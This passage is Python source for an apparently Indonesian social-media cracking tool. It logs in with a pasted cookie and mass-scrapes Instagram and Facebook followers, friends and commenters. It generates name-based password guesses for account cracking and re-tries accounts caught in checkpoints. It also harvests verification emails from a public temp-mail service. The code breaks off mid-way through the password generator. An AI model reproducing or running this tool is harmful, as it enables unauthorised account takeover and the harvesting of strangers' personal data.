
# -*- coding: utf-8 -*-

Los, xx, un = 0, 0, []
Warning = '\n\n [!] Jangan Edit Apapun Agar Script Berjalan Dengan Semestinya, terima kasih'

import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string, platform
from bs4 import BeautifulSoup as bsp
from concurrent.futures import ThreadPoolExecutor
from rich import print as Print
from rich.tree import Tree
from rich.panel import Panel as Nel
from rich.console import Console

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K
WR = random.choice(['\x1b[1;97m','\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m'])

Tema  = []
Lylii = 'color(4)'
Mail  = []
datetim = datetime.datetime.now()
datenow = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
file_ok = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
KamuNya = b'x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82'
temane  = []

class MAIN:

   userid = [] #-> Dump IG
   pk_idg = [] #-> Dump IG
   fauser = [] #-> Dump Facebook
   id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
   NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []


   def __init__(self):
       super(MAIN).__init__()
       self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; F5321 Build/34.4.A.2.32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (26/8.0.0; 320dpi; 720x1184; Sony; F5321; F5321; qcom; ru_RU; 99640905)',}

   def MyRich(self, Text, chos=None, title=None):
       self.cat = 'color(8)'
       if self.cat not in Tema:Tema.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat,title=title))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat,title=title))
   
   def MyRic(self, Text, chos=None):
       self.cat = 'color(8)'
       if self.cat not in temane:temane.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat))

   def Me(self):
       self.MyRich('''[green]
 ___   _  _______  ___      __   __  ___   __    _ 
|   | | ||       ||   |    |  | |  ||   | |  |  | |
|   |_| ||    ___||   |    |  |_|  ||   | |   |_| |
|      _||   |___ |   |    |       ||   | |       |
|     |_ |    ___||   |___ |       ||   | |  _    |
|    _  ||   |___ |       | |     | |   | | | |   |
|___| |_||_______||_______|  |___|  |___| |_|  |__|

                                                          ''')


   def find_res(self, meki=[]):
       try:
           self.file = os.listdir('data')
           self.dihi = 0
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
               else:
                    self.dihi +=1
                    print(' %s. %s'%(self.dihi,self.su))
           self.name = input('\n Masukan nama file : ')
       except Exception as e:exit(e)
       for a in open(f'data/{self.name}','r').read().splitlines():
           xyz = re.findall('ds_user_id=(.*)',str(a))
           if len(xyz) == 0:continue
           else:
                if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
       if len(meki) == 0:
          exit(f'\nTidak Bisa menemukan cokie!')
       else:
          for memek in meki:
              try:
                  print(f'\n Mencoba: {H}{memek}{P}')
                  xyz = {'Mozilla/5.0 (Linux; Android 14; SM-F731B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.5 Mobile Safari/537.36'}
                  uid = re.search('ds_user_id=(\d+)', str(memek)).group(1)
                  req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':memek}).json()['user']['full_name']
                  open('data/IG-login.txt','w').write(f'{memek}')
                  print(f'\n {P}Login sebagai : {H}{req}')
                  time.sleep(2)
                  os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                  self.insta()
              except Exception as e:
                  print(f'\n{P} Expired: {K}{memek}')

   def aset_ig(self):
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       if os.path.isfile('data/IG-login.txt') is True:
           self.coki = {'cookie':open('data/IG-login.txt','r').read()}
       else:
           os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
           self.Me()
           self.MyRich("[white]'[green][/]' MASUKAN COKIE DI BAWAH UNTUK LOGIN",True)
           self.momo = {'cookie':Console(style=Tema[0]).input(f'   └──> ')}
           if self.momo['cookie'] == 'res':
              self.coki = {'cookie':self.find_res()}
           else:self.coki = self.momo
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=xyz,  cookies=self.coki).json()
           uid = re.search('ds_user_id=(\d+)', str(self.coki['cookie'])).group(1)
           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies=self.coki).json()['user']
           open('data/IG-login.txt','w').write(f'{self.coki["cookie"]}')
       except:
           os.system('rm -rf data/IG-login.txt')
           print('\nInvalid cookie')
           exit()
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       return self.coki, req['full_name'], req['follower_count'], req['username']

   def insta(self):
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       self.aset, self.nama, self.fol, self.usr = self.aset_ig()
       self.Me()
       if len(self.nama) > 11:
          self.nama = self.nama[:11]
       self.ds_user  = re.search('ds_user_id=(\d+)',str(self.aset)).group(1)
       self.MyRich(f'''[white]
 >> Username         : {self.usr}
 >> FullName         : {self.nama}
 >> Followers        : {self.fol}
 >> User ID          : {self.ds_user} \n''',None,'[white]> [green]DETAIL USER[/] <')
       self.MyRich(''' [white]01. Crack Dari Followers    06. Crack Dari Komentar
 02. Crack Dari Following    07. Crack Unlimited Followers
 03. Check Akun Checkpoint   08. Setting Thema/Warna Panel
 04. Check Hasil Crack       09. Laporkan Bug/Upgrade Key
 05. Save Hasil Ke SDcard    10. Ganti Akun Tumbal
 11. Cari Akun Verif Email   12. Crack Akun Facebook''',True)
       self.chs(self.aset)

   def chs(self, assets):
       while True:
         x = Console(style=Tema[0]).input(f'   └──> ')
         if x in   ['01','1']:self.dumps(assets, True)
         elif x in ['02','2']:self.dumps(assets, False)
         elif x in ['03','3']:self.Ulang()
         elif x in ['04','4']:self.igrst()
         elif x in ['05','5']:self.save_sd()
         elif x in ['06','6']:self.komentar(assets)
         elif x in ['07','7']:self.Unli(assets)
         elif x in ['08','8']:self.theme()
         elif x in ['09','9']:exit(os.system('xdg-open https://wa.me/+6285729416714?text='))
         elif x in ['10']:os.system('rm -rf data/IG-login.txt');self.insta()
         elif x in ['12']:
            #   exit('\nFiture Akan Tersedia Dalam Beberapa H/M')
              if os.path.isfile('data/FB-login.txt') is False:
                 exit(self.MyRich(f'[white]\
Untuk Menggunakan Fitur Ini Anda Harus Jalankan Dengan Memasukan Perintah Di Bawah Ini\n\
\n\t    [bold green]python {sys.argv[0]} FACEBOOK=True[/]\n\
\n\tSalin Text Di Atas Untuk Mempercepat!'))
              else:
                 try:
                     self.cokie, self.token = open('data/FB-login.txt','r').read().split('|')
                     self.req = requests.post('https://graph.facebook.com/me?batch=[{"method":"get","relative_url":"me"}]&include_headers=false&access_token=%s'%(self.token), cookies={'cookie':self.cokie}).json()
                     self.res = json.loads(self.req[0]['body'])
                     self.ttl = self.res['birthday']
                     self.uid = self.res['id']
                     self.lam = self.Gender(self.res['gender'])
                     self.nam = self.res['name']
                     self.MyRich(f'[white]\n >> Nama Users : {self.nam}\n >> Gender     : {self.lam}\n >> BirthDay   : {self.ttl}\n >> UserID     : {self.uid}\n',None,'[white]> [green]DETAIL USER[/] <')
                 except (KeyError, Exception):
                     exit('\nMembutuhkan cookie baru!')
              self.Facebook(cookies=self.cokie, token=self.token)
         elif x in ['11']:
              self.MyRich('[white]Masukan Kata Kunci Untuk Pencarian Email, Misalnya : good,boy,girl kata kunci dengan menggunakan bahasa inggris akan cepat mendapatkan email!',True)
              self.Target = Console(style=Tema[0]).input(f'   └──> ').replace(' ','').split(',')
              self.MyRich('[white] 01. Tampilkan Hanya Email Dari Facebook\n 02. Tampilkan Hanya Email Dari Instagram\n 03. Tampilkan Hanya Email Dari Tiktok\n 04. Tampilkan Hanya Email Dari Twitter\n 05. Tampilkan Semua Tidak Di Filter',True)
              self.fil = Console(style=Tema[0]).input(f'   └──> ')
              if self.fil in   ['1','01']:filter='fb'
              elif self.fil in ['2','02']:filter='ig'
              elif self.fil in ['3','03']:filter='tk' # tiktok
              elif self.fil in ['4','04']:filter='tw' # twiter
              elif self.fil in ['5','05']:filter='ls' # all
              else:filter='ls'
              self.CariNama(self.Target, filter)

   def CariNama(self, Items, Fil):
       self.MyRich(f'[white]Proses Sedang Di Mulai! Email Yang Tersedia Akun [Tiktok,Facebook,Instagram,Twitter] Akan Di Simpan Di Dalam Folder [green]data/email/Email-{datenow}[/] Nikamati Semua Fiture Yang Saya Berikan:)')
       self.bef = []
       print('')
       with ThreadPoolExecutor(max_workers=3) as Executor:
           for self.e in Items:
               Executor.submit(self.FindMesage, self.e, self.bef, Fil)
       if len(self.bef) !=0:
          exit(f'\nSelamat Kamu Mendapatkan {len(self.bef)} Email\nKata Kunci {Items}')
       else:
          exit('\nGunakan Kata Kunci Yang Lain!')

   def FindMesage(self, user, duplikat, filters):
       global Los
       try:
            self.req = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={user}').json()
            for self.mes in self.req:
                self.sender = re.findall("'sender': '(.*?)'",str(self.mes))
                self.alamat = re.findall("'recipient': '(.*?)'",str(self.mes))
                if str(filters) == 'ls':
                   if 'instagram' in str(self.sender[0].lower()) or 'facebook' in str(self.sender[0].lower()) or 'instagram' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                          open(f'data/email/EmailAcak-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                   else: Los +=1
                elif filters == 'ig':
                    if 'instagram' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailInstagram-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open('tes.json','a').write(f'{self.alamat[0]}\n')
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tk':
                    if 'tiktok' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailTiktok-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tw':
                    if 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailTwitter-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'fb':
                    if 'facebook' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailFacebook-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
            print(f'Success: {len(duplikat)} Skip: {Los}',end='\r')
       except:pass

   def Facebook(self, **args):
       self.token = str(args['token'])
       self.cokie = str(args['cookies'])
       self.MyRich('''[white] 01. Crack Dari Teman           06. Check Hasil Crack
 02. Crack Dari Komentar        07. Crack Ulang Akun CP
 03. Crack Dari Anggota Group   08. Check Opsi Akun CP
 04. Crack Dari Pencarian Nama  09. Ganti Akun Tumbal
 05. Crack Dari Random Email    10. Kembali''',True)
       while True:
          x = Console(style=Tema[0]).input(f'   └──> ')
          if x in   ['01','1']:self.TemanFb(self.cokie, self.token)
          elif x in ['02','2']:self.KomentarFb(self.cokie)
          elif x in ['03','3']:self.AnggotaGroup(self.cokie)
          elif x in ['04','4']:self.PencarianNamaFb(self.cokie)
          elif x in ['05','5']:self.RandomEmail()
          elif x in ['06','6']:self.HasilFb()
          elif x in ['07','7']:self.CrackUlangFb()
          elif x in ['08','8']:self.CekOpsi()
          elif x in ['09','9']:os.system('rm -rfdata/FB-login.txt');self.insta()
          elif x in ['10']:self.insta()

   def TemanFb(self, cokie, token):
       self.MyRich('[white]Masukan ID Target Gunakan Tanda Koma Sebagai Pemisah (,)',True)
       self.ab = Console(style=Tema[0]).input(f'   └──> ').split(',')
       with ThreadPoolExecutor(max_workers=2) as Exe:
          for self.id in self.ab:Exe.submit(self.DumpTeman, self.id, cokie, token)

   def DumpTeman(self, user, cokie, token):
       with requests.Session() as self.r:
         try:
             self.req = self.r.get('https://graph.facebook.com/%s?fields=friends&access_token=%s'%(user, token), cookies={'cookie':cokie}).json()['friends']['data']
             for self.apc in self.req:
                 self.mat = '%s|%s'%(self.apc['name'], self.apc['id'])
                 if self.mat not in self.fauser:self.fauser.append(self.mat)
         except:pass

   def KomentarFb(self, cokie):
       self.MyRich('[white]Masukan link postingan Pastikan Target Bersifat Publik [Group,Post Teman]',True)
       self.link = Console(style=Tema[0]).input(f'   └──> ')
       self.host = self.link.split('//')[1].split('/')[0]
       self.repl = self.link.replace(self.host,'mbasic.facebook.com')
       self.DumpKomen(self.repl, cokie)

   def DumpKomen(self, curl, cokie):
       with requests.Session() as self.r:
         try:
             self.req  = self.r.get(curl, cookies={'cookie':cokie}).text
             self.data = re.findall('<h3><a class=".*?" href="(.*?)">(.*?)</a></h3>', str(self.req))
             for self.apc in self.data:
                 if '/profile.php?' in self.apc[0]:
                     self.id, self.nama = re.search('id=(.*?)&',str(self.apc[0])).group(1), self.apc[1]
                     self.mat = '%s|%s'%(self.nama, self.id)
                     print(self.mat)
                     if self.mat not in self.fauser:self.fauser.append(self.mat)
                 else:
                     self.username, self.nama = re.search('/(.*?)?eav',str(self.apc[0])).group(1), self.apc[1]
                     self.mat = '%s|%s'%(self.nama, self.username.split('?')[0])
                     print(self.mat)
                     if self.mat not in self.fauser:self.fauser.append(self.mat)
             for self.link in bsp(self.req,'html.parser').find_all('a', href=True):
                 if 'Lihat komentar lainnya…' in str(self.link.text):
                     self.DumpKomen(self.link['href'], cokie)
                 else:continue
         except:pass

   def Gender(self, xxxx):
       return 'Laki-Laki' if xxxx.lower() == 'male' else 'Perempuan'

   def theme(self):
       self.MyRich('\
[white] 01. Set Tema Hijau          04. Set Tema Putih\n\
 02. Set Tema Merah          05. Set Tema Ungu\n\
 03. Set Tema Biru           06. Set Tema Kuning\n\
 07. Set Tema Default',True)
       while True:
          x = Console(style=Tema[0]).input(f'   └──> ')
          if x in   ['01','1']:open('cat_rich.py','w').write("Lylii = 'color(10)'")
          elif x in ['02','2']:open('cat_rich.py','w').write("Lylii = 'color(9)'")
          elif x in ['03','3']:open('cat_rich.py','w').write("Lylii = 'color(4)'")
          elif x in ['04','4']:open('cat_rich.py','w').write("Lylii = 'color(7)'")
          elif x in ['05','5']:open('cat_rich.py','w').write("Lylii = 'color(5)'")
          elif x in ['06','6']:open('cat_rich.py','w').write("Lylii = 'color(3)'")
          elif x in ['07','7']:open('cat_rich.py','w').write("Lylii = 'color(8)'")
          exit(os.system(f'python {sys.argv[0]}'))

   def save_sd(self, col = []):
       try:
           self.file = os.listdir('data')
           self.hitg = 0
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               self.xy = self.su.split('Instagram')
               if len(self.xy) <2:pass
               else:
                    self.hitg +=1
                    col.append(self.su)
                    print(' %s. %s'%(self.hitg,self.su))
           print('')
           self.MyRich('[white]Ketik [green]all[/] Untuk Menyimpan Semua Hasil Crack Anda Ke sdcard OnTap. Masukan nama file jika ingin menyimpan salah satu',True)
           self.name = Console(style=Tema[0]).input(f'   └──> ')
           if self.name in ('all','All'):
              for self.xyz in col:
                  os.system(f'cp data/{self.xyz} /sdcard')
              exit('\nDone')
           else:
              os.system(f'cp data/{self.name} /sdcard')
              exit('\nDone')
       except Exception as e:exit(e)

   def komentar(self, cokie, dav=[]):
       self.MyRich('[white]Masukan link postingan atau reels. pisahkan dengan koma',True)
       link = Console(style=Tema[0]).input(f'   └──> ').split(',')
       try:
           for ling in link:
               self.r = requests.get(ling, cookies=cokie).text
               self.o = re.search('"media_id":"(\d+)"', str(self.r)).group(1)
               dav.append(self.o)
           for self.x in dav:
               self.dump_komen(cokie, self.x, '')
       except:pass
       self.ToolsType()

   def dump_komen(self, cokie, uid, min):
       global xx
       try:
            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
            for self.i in self.r['comments']:
                self.a = self.i['user']['username'] +'|'+ self.i['user']['full_name']
                if self.a not in self.pk_idg:
                   self.pk_idg.append(self.a)
                   xx +=1
                   Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{xx}[/] id [white]{uid}[/]',end='\r')
            if 'next_min_id' in str(self.r):
                self.dump_komen(cokie, uid, self.r['next_min_id'])
       except:pass

   def Unli(self, cokie):
       if 'csrftoken' not in str(cokie['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cokie).json()
              self.token = self.memek['config']['csrf_token']
              cokie['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       self.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru)[/]',True)
       self.user = Console(style=Tema[0]).input(f'   └──> ')
       try:
           req = requests.get(f'https://www.instagram.com/{self.user}/', cookies = cokie).text
           uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
           self.Exekusi(uid, cokie, '', True,True)
       except:pass
       if len(un) > 0:
          self.MyRich('[white]Matikan data/wifi jika anda ingin stop dump!. jangan gunakan [red]CTRL + C[/]')
          for self.momok in un:
              self.Graphql(True, self.momok, cokie['cookie'], '')
       else:exit('\nGanti Username/Tumbal!')
       self.ToolsType()

   def igrst(self):
       print('')
       self.dirs  = os.listdir('data')
       self.index = 0
       for self.name in self.dirs:
           if '-' not in self.name or 'login' in self.name:pass
           else:
                self.index+=1
                print(' %s. data/%s'%(self.index, self.name))
       print('')
       self.MyRich('\
[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',True)
       self.file = Console(style=Tema[0]).input(f'   └──> ').split(',')
       for self.bx in self.file:
           for self.xv in open(self.bx,'r').read().splitlines():
               print(' %s\n'%(self.xv))
       exit()

   def Ulang(self):
       try:
          dirs = os.listdir('data')
          asuu = 0
          if len(dirs) == 0:exit(f'\n{P}[{M}!{P}] File Tidak Ada')
          print('')
          for asu in dirs:
              if 'CP' not in str(asu):pass
              else:
                  asuu +=1
                  print(f' {asuu}. {asu}')
          print('')
          self.MyRich('[white]Masukan Nama file. Jangan Angkanya contoh: CP/Example.txt',True)
          file = Console(style=Tema[0]).input(f'   └──> ')
          for rest in open(f'data/{file}','r').read().splitlines():
              uid, pas = rest.split('|')[0], rest.split('|')[1]
              self.pk_idg.append(f'{uid}|{pas}')
              Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{len(self.pk_idg)}[/]',end='\r')
       except (FileNotFoundError,ValueError):
          exit('\nFile Tidak Ada Atau Pemisahan Salah.')
       self.ToolsType()

   def dumps(self, cintil, typess, xyz = []):
       if 'csrftoken' not in str(cintil['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
              self.token = self.memek['config']['csrf_token']
              cintil['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       self.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru) Ingin banyak target gunakan tanda koma sebagai pemisah contohnya [green](rikod_jual1,miskindeh)[/]',True)
       users = Console(style=Tema[0]).input(f'   └──> ').split(',')
       try:
           for self.y in users:
               req = requests.get(f'https://www.instagram.com/{self.y}/', cookies = cintil).text
               uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
               if uid not in xyz:xyz.append(uid)
       except:pass
       try:
           mode = 'followers' if typess is True else 'following'
           for kintil in xyz:
               if typess is True:self.Graphql(True, kintil, cintil['cookie'], '')
               else:self.Graphql(False, kintil, cintil['cookie'], '')
       except:
            exit(self.ToolsType())
       exit(self.ToolsType())

   def Exekusi(self, uid, cokie, next, mode,unli=None):
       global xx
       headers = {'Host': 'www.instagram.com','x-requested-with': 'XMLHttpRequest','x-csrftoken': re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1),'x-ig-app-id': '1217981644879628','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
       params  = {'count': '12','search_surface': 'follow_list_page','max_id':next}
       if mode == 'following':response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/following/?count=12&max_id={next}', cookies=cokie,headers=headers).json()
       else:response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/followers/',params=params,cookies=cokie,headers=headers).json()
       for self.mmk in response['users']:
           xx+=1
           self.xy = self.mmk['username'] + '|' + self.mmk['full_name']
           if self.xy not in self.pk_idg:
              if unli is None:
                 self.pk_idg.append(self.xy)
              else:
                 self.zc = self.mmk['pk']
                 un.append(self.zc)
                 if len(un) == 5:
                    break
       if 'next_max_id' in str(response):
           self.Exekusi(uid, cokie, response['next_max_id'], mode)

   def Graphql(self, typess, userid, cokie,after):
       global xx
       self.api = "https://www.instagram.com/graphql/query/"
       self.csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
       self.mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(self.csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(self.csr)
       try:
           self.ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
           self.req = requests.get(self.api, params=self.mek, headers=self.ptk).json()
           if 'require_login' in self.req:
               if len(self.pk_idg) > 0:
                  pass
               else:
                  exit(f'\n{P}Invalid Cookie')
           self.khm = 'edge_followed_by' if typess is True else 'edge_follow'
           for self.xyz in self.req['data']['user'][self.khm]['edges']:
               self.xy = self.xyz['node']['username'] + '|' + self.xyz['node']['full_name']
               if self.xy not in self.pk_idg:
                  xx +=1
                #   open('dumpig.txt','a', encoding='utf-8').write(f"{self.xyz['node']['username']}\n")
                  self.pk_idg.append(self.xy)
                  Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{xx}[/] id [white]{userid}[/]',end='\r')
           self.end = self.req['data']['user'][self.khm]['page_info']['has_next_page']
           if self.end is True:
               self.after = self.req['data']['user'][self.khm]['page_info']['end_cursor']
               self.Graphql(typess, userid, cokie, self.after)
           else:pass
       except:
        return 1

   def ToolsType(self):
       MAIN().List(self.pk_idg)
       
   def List(self, uid):
       for me in uid:self.id.append(me)
       self.MyRic('\
[cyan]01[white]. [green]Api Private [purple]Threads     [cyan]03[white]. [green]Api Private Type [purple]Recovery\
 [cyan]02[white]. [green]Api Private Type [purple]Manual [cyan]04[white]. [green]Api Private Type [purple]SmartLock',True)

       self.Main()

   def Main(self):
       while True:
         x = Console(style=temane[0]).input('   └──> ')
         if x in   ['01','1']: self.MethodType.append('1')
         elif x in ['02','2']: self.MethodType.append('2')
         elif x in ['03','3']: self.MethodType.append('3')
         elif x in ['04','4']: self.MethodType.append('4')
         break
      # self.proxi_anony('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&proxy_format=protocolipport&format=text&timeout=20000')
       self.Exekusy()

   def Exekusy(self):
       self.MyRich('\
[cyan]Perlu Di Perhatikan Mengubah Data Menggunakan Script Dapat Menyebabkan Akun Terkena Sesi/Checkpoint \
Saran Untuk Tidak Menggunakan Fiture Ini. Jika Anda Ingin Mengubah Data Ketikan [green]y [/]sebaliknya ketikan [green]t',True)
       x = Console(style=temane[0]).input(f'   └──> ')
       if x in ['ya','y']:self.UbahData.append(True)
       else:self.UbahData.append(False)
       self.Exekusy2()

   #-> Buat Sandi
   def pwdc(self, nama, full, komb):
       self.x,self.i = [], []
       self.x.append('kamunanya')
       self.x.append('kamu nanya')
       self.x.append('katasandi')
       self.x.append('kata sandi')
       self.x.append('bismillah')
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'123456789')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'123@')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'22')
                 self.x.append(self.z+' 123')
                 self.x.append(self.z+' 1234')
                 self.x.append(self.z+' 12345')
                 self.x.append(self.z)
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'123456789')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'123@')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'22')
                 self.x.append(self.z+' 123')
                 self.x.append(self.z+' 1234')
                 self.x.append(self.z+' 12345')
                 self.x.append(self.z)
              else:
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'123456789')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'123@')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'22')
                 self.x.append(self.z+' 123')
                 self.x.append(self.z+' 1234')
                 self.x.append(self.z+' 12345')
                 self.x.append(self.z)
           else:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'03')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'05')
                 self.x.append(self.z+'@#$')
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'123@')
